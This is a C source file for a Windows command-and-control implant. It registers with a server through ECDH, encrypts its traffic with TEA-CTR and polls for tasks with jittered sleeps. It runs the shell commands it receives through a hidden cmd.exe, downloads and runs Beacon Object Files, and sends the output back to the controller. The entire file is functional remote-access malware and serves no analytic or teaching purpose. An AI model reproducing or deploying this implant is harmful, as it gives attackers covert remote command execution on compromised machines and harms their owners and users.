#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <bcrypt.h>

#include "COFFLoader.h"
#include "beacon_compatibility.h"

// ---------------------------------------------------------------------------
// TEA-CTR encryption — key derived per-session via ECDH, not hardcoded
// ---------------------------------------------------------------------------

static uint8_t SESSION_KEY[16] = {0};  // set once during registration

#define TEA_DELTA 0x9e3779b9u
static void tea_encrypt(uint32_t *v, const uint32_t *k) {
    uint32_t sum = 0;
    for (int i = 0; i < 32; i++) {
        sum  += TEA_DELTA;
        v[0] += ((v[1] << 4) + k[0]) ^ (v[1] + sum) ^ ((v[1] >> 5) + k[1]);
        v[1] += ((v[0] << 4) + k[2]) ^ (v[0] + sum) ^ ((v[0] >> 5) + k[3]);
    }
}

static void tea_ctr_xor(const uint8_t *key, uint64_t nonce, uint64_t counter,
                         const uint8_t *in, uint8_t *out, size_t len) {
    uint32_t k[4];
    memcpy(k, key, 16);
    uint64_t ctr = nonce + counter;
    for (size_t off = 0; off < len; off += 8) {
        uint8_t stream[8];
        memcpy(stream, &ctr, 8);
        tea_encrypt((uint32_t *)stream, k);
        ctr++;
        size_t rem = len - off;
        for (size_t i = 0; i < rem && i < 8; i++)
            out[off + i] = in[off + i] ^ stream[i];
    }
}

// ---------------------------------------------------------------------------
// BCrypt RNG — used for nonces and ECDH keypair generation
// ---------------------------------------------------------------------------
static void gen_random_bytes(uint8_t *buf, size_t len) {
    BCRYPT_ALG_HANDLE hAlg;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, NULL, 0) == 0) {
        BCryptGenRandom(hAlg, buf, (ULONG)len, 0);
        BCryptCloseAlgorithmProvider(hAlg, 0);
    } else {
        // fallback — should never be reached
        for (size_t i = 0; i < len; i++)
            buf[i] = (uint8_t)(rand() & 0xFF);
    }
}

// ---------------------------------------------------------------------------
// SHA-256 via BCrypt — used as KDF: SESSION_KEY = SHA-256(shared_secret)[:16]
// ---------------------------------------------------------------------------
static int bcrypt_sha256(const uint8_t *data, ULONG data_len, uint8_t out[32]) {
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    int result = -1;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptHashData(hHash, (PUCHAR)data, data_len, 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptFinishHash(hHash, out, 32, 0)))
        goto cleanup;
    result = 0;

cleanup:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// ---------------------------------------------------------------------------
// ECDH-P256 key exchange
//
// Wire format (all plaintext, only during /register):
//   Beacon  →  Server : 0x04 || X[32] || Y[32]          (65 bytes, X9.62 uncompressed)
//   Server  →  Beacon : 0x04 || X[32] || Y[32] || uuid  (65 + 36 = 101 bytes)
//
// Both sides compute:
//   shared_secret  = ECDH(our_priv, peer_pub)            (32-byte X coordinate)
//   SESSION_KEY    = SHA-256(shared_secret)[:16]          (16-byte TEA key)
//
// All subsequent traffic is TEA-CTR encrypted with SESSION_KEY.
// ---------------------------------------------------------------------------

// Build a BCRYPT_ECCKEY_BLOB from a raw 65-byte X9.62 uncompressed point.
// Skips the leading 0x04 byte; layout: [magic(4)][cbKey(4)][X(32)][Y(32)]
static int import_peer_pubkey(const uint8_t peer_x962[65], BCRYPT_KEY_HANDLE *hKey_out) {
    uint8_t  blob[8 + 64];
    uint32_t magic = 0x314B4345u;  // BCRYPT_ECDH_PUBLIC_P256_MAGIC
    uint32_t cbKey = 32;
    memcpy(blob,      &magic, 4);
    memcpy(blob +  4, &cbKey, 4);
    memcpy(blob +  8, peer_x962 + 1, 64); // skip the 0x04 prefix

    BCRYPT_ALG_HANDLE hAlg = NULL;
    int result = -1;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0))) {
        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider(ECDH_P256) failed\n");
        return -1;
    }
    NTSTATUS status = BCryptImportKeyPair(hAlg, NULL, BCRYPT_ECCPUBLIC_BLOB,
                                          hKey_out, blob, sizeof(blob), 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "[!] BCryptImportKeyPair failed: 0x%08lX\n", (unsigned long)status);
    } else {
        result = 0;
    }
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// Generate ephemeral P-256 keypair. Exports our public key as 65-byte X9.62.
// Caller owns hPrivKey_out and must BCryptDestroyKey it after deriving the secret.
static int gen_ecdh_keypair(BCRYPT_KEY_HANDLE *hPrivKey_out, uint8_t our_pub_x962[65]) {
    BCRYPT_ALG_HANDLE hAlg  = NULL;
    int               result = -1;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0))) {
        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider(ECDH_P256) failed\n");
        return -1;
    }
    if (!BCRYPT_SUCCESS(BCryptGenerateKeyPair(hAlg, hPrivKey_out, 256, 0))) {
        fprintf(stderr, "[!] BCryptGenerateKeyPair failed\n");
        goto cleanup;
    }
    if (!BCRYPT_SUCCESS(BCryptFinalizeKeyPair(*hPrivKey_out, 0))) {
        fprintf(stderr, "[!] BCryptFinalizeKeyPair failed\n");
        BCryptDestroyKey(*hPrivKey_out);
        *hPrivKey_out = NULL;
        goto cleanup;
    }

    // Export: BCRYPT_ECCKEY_BLOB = [magic(4)][cbKey(4)][X(32)][Y(32)]
    uint8_t blob[8 + 64];
    ULONG   blob_len = 0;
    if (!BCRYPT_SUCCESS(BCryptExportKey(*hPrivKey_out, NULL, BCRYPT_ECCPUBLIC_BLOB,
                                        blob, sizeof(blob), &blob_len, 0))
        || blob_len < 8 + 64) {
        fprintf(stderr, "[!] BCryptExportKey failed\n");
        BCryptDestroyKey(*hPrivKey_out);
        *hPrivKey_out = NULL;
        goto cleanup;
    }

    // Convert to X9.62 uncompressed: 0x04 || X || Y
    our_pub_x962[0] = 0x04;
    memcpy(our_pub_x962 + 1, blob + 8, 64);
    result = 0;

cleanup:
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// Perform ECDH and derive SESSION_KEY = SHA-256(raw_shared_secret)[:16].
// Destroys hPrivKey and hPeerPub when done regardless of outcome.
static int derive_session_key(BCRYPT_KEY_HANDLE hPrivKey, BCRYPT_KEY_HANDLE hPeerPub) {
    BCRYPT_SECRET_HANDLE hSecret = NULL;
    int result = -1;

    if (!BCRYPT_SUCCESS(BCryptSecretAgreement(hPrivKey, hPeerPub, &hSecret, 0))) {
        fprintf(stderr, "[!] BCryptSecretAgreement failed\n");
        goto cleanup;
    }

    // Extract raw shared secret (X coordinate, 32 bytes for P-256)
    ULONG raw_len = 0;
    BCryptDeriveKey(hSecret, BCRYPT_KDF_RAW_SECRET, NULL, NULL, 0, &raw_len, 0);
    if (raw_len == 0) {
        fprintf(stderr, "[!] BCryptDeriveKey (size query) returned 0\n");
        goto cleanup;
    }

    uint8_t *raw = (uint8_t *)malloc(raw_len);
    if (!raw) goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptDeriveKey(hSecret, BCRYPT_KDF_RAW_SECRET, NULL,
                                         raw, raw_len, &raw_len, 0))) {
        fprintf(stderr, "[!] BCryptDeriveKey (extract) failed\n");
        free(raw);
        goto cleanup;
    }

    for (ULONG i = 0; i < raw_len / 2; i++) {
      uint8_t tmp = raw[i];
      raw[i] = raw[raw_len - 1 - i];
      raw[raw_len - 1 - i] = tmp;
    }

    // KDF: SESSION_KEY = SHA-256(shared_secret)[:16]
    uint8_t hash[32];
    if (bcrypt_sha256(raw, raw_len, hash) == 0) {
        memcpy(SESSION_KEY, hash, 16);
        SecureZeroMemory(hash, 32);
        result = 0;
    }
    SecureZeroMemory(raw, raw_len);
    free(raw);

cleanup:
    if (hSecret) BCryptDestroySecret(hSecret);
    BCryptDestroyKey(hPrivKey);
    BCryptDestroyKey(hPeerPub);
    return result;
}

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------
#define SERVER_IP        "127.0.0.1"
#define SERVER_PORT      8080
#define USER_AGENT       "Mozilla/5.0"

#define OUTPUT_BUF_SIZE  (256 * 1024)
#define HTTP_BUF_SIZE    (512 * 1024)
#define CMD_BUF_SIZE     4096
#define PATH_BUF_SIZE    512
#define AGENT_ID_SIZE    256

#define SLEEP_BASE_MS    5000
#define SLEEP_JITTER_MS  3000

// ---------------------------------------------------------------------------
// Output buffer (unchanged)
// ---------------------------------------------------------------------------
static char *beacon_buf     = NULL;
static int   beacon_buf_pos = 0;
static int   beacon_buf_cap = 0;
static char  cwd[MAX_PATH]  = {0};

static void buf_append(const char *data, int len) {
    if (!beacon_buf) return;
    if (beacon_buf_pos + len >= beacon_buf_cap) {
        const char *msg = "[!] Output buffer full\n";
        int msglen = (int)strlen(msg);
        if (beacon_buf_pos + msglen < beacon_buf_cap) {
            memcpy(beacon_buf + beacon_buf_pos, msg, msglen);
            beacon_buf_pos += msglen;
        }
        return;
    }
    memcpy(beacon_buf + beacon_buf_pos, data, len);
    beacon_buf_pos += len;
}

static void buf_reset(void) {
    beacon_buf_pos = 0;
    if (beacon_buf) memset(beacon_buf, 0, beacon_buf_cap);
}

void beacon_log(const char *fmt, ...) {
    if (!beacon_buf) return;
    char tmp[2048];
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, args);
    va_end(args);
    if (n > 0) buf_append(tmp, n);
}

// ---------------------------------------------------------------------------
// Raw HTTP POST — plaintext, used only for the /register handshake
// ---------------------------------------------------------------------------
static int http_post_raw(const char *host, int port, const char *path,
                         const uint8_t *body, int body_len,
                         uint8_t **out_body, int *out_body_len) {
    SOCKET  sockfd = INVALID_SOCKET;
    struct  sockaddr_in addr;
    char    hdr[512];
    uint8_t *resp  = NULL;
    int     total  = 0, bytes, ret = -1;

    *out_body     = NULL;
    *out_body_len = 0;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == INVALID_SOCKET) goto cleanup;

    addr.sin_family = AF_INET;
    addr.sin_port   = htons((u_short)port);
    inet_pton(AF_INET, host, &addr.sin_addr);
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) goto cleanup;

    snprintf(hdr, sizeof(hdr),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n",
        path, host, port, USER_AGENT, body_len);

    if (send(sockfd, hdr,           (int)strlen(hdr), 0) == SOCKET_ERROR) goto cleanup;
    if (send(sockfd, (const char *)body, body_len,    0) == SOCKET_ERROR) goto cleanup;

    resp = (uint8_t *)malloc(HTTP_BUF_SIZE);
    if (!resp) goto cleanup;

    while (total < HTTP_BUF_SIZE - 1) {
        bytes = recv(sockfd, (char *)resp + total, HTTP_BUF_SIZE - total - 1, 0);
        if (bytes <= 0) break;
        total += bytes;
    }
    resp[total] = '\0';

    char *body_start = strstr((char *)resp, "\r\n\r\n");
    if (!body_start) goto cleanup;
    body_start += 4;

    int blen    = total - (int)(body_start - (char *)resp);
    uint8_t *out = (uint8_t *)malloc(blen + 1);
    if (!out) goto cleanup;
    memcpy(out, body_start, blen);
    out[blen]     = '\0';
    *out_body     = out;
    *out_body_len = blen;
    ret = 0;

cleanup:
    if (sockfd != INVALID_SOCKET) closesocket(sockfd);
    free(resp);
    return ret;
}

// ---------------------------------------------------------------------------
// Encrypted HTTP POST — TEA-CTR, used for all traffic after key exchange
// (identical to original except uses SESSION_KEY instead of hardcoded ENC_KEY)
// ---------------------------------------------------------------------------
static int http_post_encrypted(const char *host, int port, const char *path,
                                const uint8_t *plain_data, int plain_len,
                                uint8_t **out_plain, int *out_plain_len) {
    SOCKET   sockfd    = INVALID_SOCKET;
    struct   sockaddr_in addr;
    char     hdr[512];
    uint8_t *enc_body  = NULL;
    uint8_t *resp      = NULL;
    int      total     = 0, bytes, ret = -1;

    *out_plain     = NULL;
    *out_plain_len = 0;

    // Encrypt: [8-byte nonce][TEA-CTR ciphertext]
    uint8_t nonce[8];
    gen_random_bytes(nonce, 8);
    int enc_len = plain_len + 8;
    enc_body = (uint8_t *)malloc(enc_len);
    if (!enc_body) goto cleanup;
    memcpy(enc_body, nonce, 8);
    if (plain_len > 0)
        tea_ctr_xor(SESSION_KEY, *(uint64_t *)nonce, 0, plain_data, enc_body + 8, plain_len);

    // Connect
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == INVALID_SOCKET) goto cleanup;
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((u_short)port);
    inet_pton(AF_INET, host, &addr.sin_addr);
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) goto cleanup;

    snprintf(hdr, sizeof(hdr),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n",
        path, host, port, USER_AGENT, enc_len);

    if (send(sockfd, hdr,                (int)strlen(hdr), 0) == SOCKET_ERROR) goto cleanup;
    if (send(sockfd, (const char *)enc_body, enc_len,      0) == SOCKET_ERROR) goto cleanup;

    resp = (uint8_t *)malloc(HTTP_BUF_SIZE);
    if (!resp) goto cleanup;
    while (total < HTTP_BUF_SIZE - 1) {
        bytes = recv(sockfd, (char *)resp + total, HTTP_BUF_SIZE - total - 1, 0);
        if (bytes <= 0) break;
        total += bytes;
    }
    resp[total] = '\0';

    // Extract and decrypt body
    char *body = strstr((char *)resp, "\r\n\r\n");
    if (!body) goto cleanup;
    body += 4;
    int body_len = total - (int)(body - (char *)resp);
    if (body_len < 8) goto cleanup;

    uint64_t resp_nonce = *(uint64_t *)body;
    int      cipher_len = body_len - 8;
    uint8_t *plain      = (uint8_t *)malloc(cipher_len + 1);
    if (!plain) goto cleanup;
    if (cipher_len > 0)
        tea_ctr_xor(SESSION_KEY, resp_nonce, 0, (uint8_t *)body + 8, plain, cipher_len);
    plain[cipher_len] = '\0';

    *out_plain     = plain;
    *out_plain_len = cipher_len;
    ret = 0;

cleanup:
    if (sockfd != INVALID_SOCKET) closesocket(sockfd);
    free(enc_body);
    free(resp);
    return ret;
}

// ---------------------------------------------------------------------------
// Key exchange + registration
//
// 1. Generate ephemeral P-256 keypair
// 2. POST our pubkey (65 bytes X9.62) to /register  — plaintext
// 3. Server responds: server pubkey (65 bytes) + agent UUID (36 bytes)
// 4. Derive SESSION_KEY = SHA-256(ECDH shared secret)[:16]
// 5. All subsequent requests use TEA-CTR with SESSION_KEY
// ---------------------------------------------------------------------------
static int do_register(char agent_id[AGENT_ID_SIZE]) {
    BCRYPT_KEY_HANDLE hPriv    = NULL;
    BCRYPT_KEY_HANDLE hPeerPub = NULL;
    uint8_t  our_pub[65]  = {0};
    uint8_t *resp         = NULL;
    int      resp_len     = 0;
    int      result       = -1;

    fprintf(stderr, "[*] Generating ephemeral ECDH-P256 keypair\n");
    if (gen_ecdh_keypair(&hPriv, our_pub) != 0)
        return -1;

    fprintf(stderr, "[*] Sending pubkey to %s:%d\n", SERVER_IP, SERVER_PORT);
    if (http_post_raw(SERVER_IP, SERVER_PORT, "/register",
                      our_pub, 65, &resp, &resp_len) != 0 || !resp) {
        fprintf(stderr, "[!] /register request failed\n");
        BCryptDestroyKey(hPriv);
        return -1;
    }

    // Response must be at least 65 (server pub) + 1 (uuid) bytes
    if (resp_len < 66) {
        fprintf(stderr, "[!] /register response too short (%d bytes)\n", resp_len);
        goto cleanup;
    }
    if (resp[0] != 0x04) {
        fprintf(stderr, "[!] /register response missing X9.62 prefix\n");
        goto cleanup;
    }

    // Import server's public key from the first 65 bytes
    if (import_peer_pubkey(resp, &hPeerPub) != 0)
        goto cleanup;

    // Derive SESSION_KEY — destroys hPriv and hPeerPub on return
    if (derive_session_key(hPriv, hPeerPub) != 0) {
        hPriv    = NULL;
        hPeerPub = NULL;
        goto cleanup;
    }
    hPriv    = NULL;
    hPeerPub = NULL;
    fprintf(stderr, "[*] Session key established\n");

    // Agent UUID follows the 65-byte server pubkey
    int id_len = resp_len - 65;
    if (id_len >= AGENT_ID_SIZE) id_len = AGENT_ID_SIZE - 1;
    memcpy(agent_id, resp + 65, id_len);
    agent_id[id_len] = '\0';

    char *nl;
    if ((nl = strchr(agent_id, '\r'))) *nl = '\0';
    if ((nl = strchr(agent_id, '\n'))) *nl = '\0';

    if (agent_id[0] == '\0') {
        fprintf(stderr, "[!] Empty agent ID in response\n");
        goto cleanup;
    }
    fprintf(stderr, "[*] Registered as %.8s\n", agent_id);
    result = 0;

cleanup:
    free(resp);
    if (hPriv)    BCryptDestroyKey(hPriv);
    if (hPeerPub) BCryptDestroyKey(hPeerPub);
    return result;
}

// ---------------------------------------------------------------------------
// BOF execution (unchanged)
// ---------------------------------------------------------------------------
int execute_bof(unsigned char *bof_data, size_t bof_size, char *args, int args_len) {
    char *coff_args = malloc(args_len + 4);
    if (!coff_args) return 1;
    *(DWORD *)coff_args = (DWORD)args_len;
    if (args_len > 0)
        memcpy(coff_args + 4, args, args_len);
    int   result     = RunCOFF("go", bof_data, bof_size, (unsigned char *)coff_args, args_len + 4);
    int   out_size   = 0;
    char *bof_output = BeaconGetOutputData(&out_size);
    if (bof_output && out_size > 0) {
        buf_append(bof_output, out_size);
        free(bof_output);
    }
    free(coff_args);
    return result;
}

// ---------------------------------------------------------------------------
// cd & shell (unchanged)
// ---------------------------------------------------------------------------
static void handle_cd(const char *target) {
    char new_path[MAX_PATH];
    if (!target || target[0] == '\0' || (target[0] == '~' && target[1] == '\0')) {
        const char *home = getenv("USERPROFILE");
        if (!home) home = "C:\\";
        strncpy(new_path, home, MAX_PATH - 1);
        new_path[MAX_PATH - 1] = '\0';
    } else if (target[1] == ':' || target[0] == '\\') {
        strncpy(new_path, target, MAX_PATH - 1);
        new_path[MAX_PATH - 1] = '\0';
    } else {
        snprintf(new_path, MAX_PATH, "%s\\%s", cwd, target);
    }
    DWORD attr = GetFileAttributesA(new_path);
    if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
        beacon_log("cd: not found: %s\n", new_path);
        return;
    }
    char resolved[MAX_PATH];
    if (!GetFullPathNameA(new_path, MAX_PATH, resolved, NULL)) {
        beacon_log("cd: resolve failed\n");
        return;
    }
    strncpy(cwd, resolved, MAX_PATH - 1);
    cwd[MAX_PATH - 1] = '\0';
    SetCurrentDirectoryA(cwd);
    beacon_log("%s\n", cwd);
}

void execute_shell_command(const char *command) {
    if (strncmp(command, "cd", 2) == 0 && (command[2] == ' ' || command[2] == '\0')) {
        handle_cd(command[2] == ' ' ? command + 3 : "");
        return;
    }
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        beacon_log("[!] CreatePipe failed: %lu\n", GetLastError());
        return;
    }
    STARTUPINFOA si = {0};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdOutput  = hWrite;
    si.hStdError   = hWrite;
    PROCESS_INFORMATION pi;
    char cmd_line[CMD_BUF_SIZE + 32];
    snprintf(cmd_line, sizeof(cmd_line), "cmd.exe /c %s", command);
    if (CreateProcessA(NULL, cmd_line, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                       NULL, cwd[0] ? cwd : NULL, &si, &pi)) {
        CloseHandle(hWrite);
        if (WaitForSingleObject(pi.hProcess, 30000) == WAIT_TIMEOUT) {
            TerminateProcess(pi.hProcess, 1);
            beacon_log("[!] Command timed out\n");
        } else {
            DWORD bytes_read;
            char  tmp[4096];
            while (ReadFile(hRead, tmp, sizeof(tmp) - 1, &bytes_read, NULL) && bytes_read > 0) {
                tmp[bytes_read] = '\0';
                buf_append(tmp, (int)bytes_read);
            }
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hRead);
    } else {
        beacon_log("[!] CreateProcess failed: %lu\n", GetLastError());
        CloseHandle(hWrite);
        CloseHandle(hRead);
    }
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
int main(void) {
    WSADATA wsa;
    char    agent_id[AGENT_ID_SIZE] = {0};

    srand((unsigned int)GetTickCount());
    beacon_buf     = calloc(OUTPUT_BUF_SIZE, 1);
    beacon_buf_cap = OUTPUT_BUF_SIZE;
    if (!beacon_buf) return 1;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { free(beacon_buf); return 1; }
    GetCurrentDirectoryA(MAX_PATH, cwd);

    // ECDH key exchange + registration (plaintext round-trip)
    if (do_register(agent_id) != 0) {
        fprintf(stderr, "[!] Registration failed\n");
        WSACleanup(); free(beacon_buf); return 1;
    }

    // Initial checkin (now TEA-CTR encrypted with SESSION_KEY)
    char     path[PATH_BUF_SIZE];
    uint8_t *resp = NULL; int resp_len = 0;
    snprintf(path, PATH_BUF_SIZE, "/checkin/%s", agent_id);
    http_post_encrypted(SERVER_IP, SERVER_PORT, path,
                        (uint8_t *)beacon_buf, beacon_buf_pos, &resp, &resp_len);
    free(resp);
    buf_reset();

    // Main loop (unchanged from original)
    while (1) {
        snprintf(path, PATH_BUF_SIZE, "/checkin/%s", agent_id);
        uint8_t *cmd_plain = NULL; int cmd_len = 0;
        if (http_post_encrypted(SERVER_IP, SERVER_PORT, path,
                                (uint8_t *)beacon_buf, beacon_buf_pos,
                                &cmd_plain, &cmd_len) == 0 && cmd_plain) {
            buf_reset();
            if (cmd_len > 0) {
                char safe_cmd[CMD_BUF_SIZE];
                strncpy(safe_cmd, (char *)cmd_plain, CMD_BUF_SIZE - 1);
                safe_cmd[CMD_BUF_SIZE - 1] = '\0';
                char *end = safe_cmd + strlen(safe_cmd) - 1;
                while (end >= safe_cmd && (*end == '\r' || *end == '\n' || *end == ' '))
                    *end-- = '\0';
                if (safe_cmd[0] != '\0') {
                    if (strncmp(safe_cmd, "BOF:", 4) == 0) {
                        char *bof_name = safe_cmd + 4;
                        char *args_hex = strchr(bof_name, ':');
                        if (args_hex) {
                            *args_hex++ = '\0';
                            uint8_t *bof_data = NULL; int bof_len = 0;
                            char bof_path[PATH_BUF_SIZE];
                            snprintf(bof_path, PATH_BUF_SIZE, "/getbof/%s/%s", agent_id, bof_name);
                            if (http_post_encrypted(SERVER_IP, SERVER_PORT, bof_path,
                                                    NULL, 0, &bof_data, &bof_len) == 0 && bof_data) {
                                int hex_len  = (int)strlen(args_hex);
                                int args_len = hex_len / 2;
                                char *args   = malloc(args_len + 1);
                                if (args) {
                                    for (int i = 0; i < args_len; i++) {
                                        unsigned int b;
                                        sscanf(args_hex + i * 2, "%2x", &b);
                                        args[i] = (char)b;
                                    }
                                    execute_bof(bof_data, bof_len, args, args_len);
                                    free(args);
                                }
                                free(bof_data);
                            }
                        }
                    } else {
                        execute_shell_command(safe_cmd);
                    }
                }
            }
            free(cmd_plain);
        } else {
            buf_reset();
        }
        DWORD sleep_ms = SLEEP_BASE_MS + (rand() % (SLEEP_JITTER_MS * 2)) - SLEEP_JITTER_MS;
        if (sleep_ms < 1000) sleep_ms = 1000;
        Sleep(sleep_ms);
    }

    WSACleanup();
    free(beacon_buf);
    return 0;
}